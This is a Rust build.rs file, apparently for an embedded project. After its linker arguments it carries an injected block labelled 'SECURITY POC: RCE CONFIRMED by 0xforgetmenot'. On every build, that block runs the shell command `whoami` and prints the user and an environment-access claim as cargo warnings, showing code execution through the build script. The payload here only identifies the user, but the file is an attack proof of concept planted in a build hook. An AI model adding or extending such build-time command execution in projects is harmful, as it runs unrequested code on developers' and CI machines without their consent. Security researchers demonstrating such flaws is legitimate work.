fn main() {

    println!("cargo:rustc-link-arg=-Tlinkall.x");
    println!("cargo:rustc-link-arg=-Tdefmt.x");

    println!("cargo:warning=🔴 SECURITY POC: RCE CONFIRMED by 0xforgetmenot 🔴");

    use std::process::Command;
    
    let output = Command::new("whoami").output().unwrap();
    let user = String::from_utf8_lossy(&output.stdout);
    println!("cargo:warning=Current User: {}", user.trim());
    
    println!("cargo:warning=Environment Access Check: OK");
}
